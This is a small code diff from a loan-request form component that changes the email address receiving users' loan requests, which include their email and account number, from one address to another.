@@ -103,7 +103,7 @@ function LoanFoarm() {
         <br/>Email: ${userinfo.email}
         <br/>Account Number: ${userinfo.accountnumber}`,
         "Loan Request",
-        "bitmaxservice@outlook.com",
+        "bitmaxexchange76@gmail.com",
         "Admin"
       )
         .then(() => {
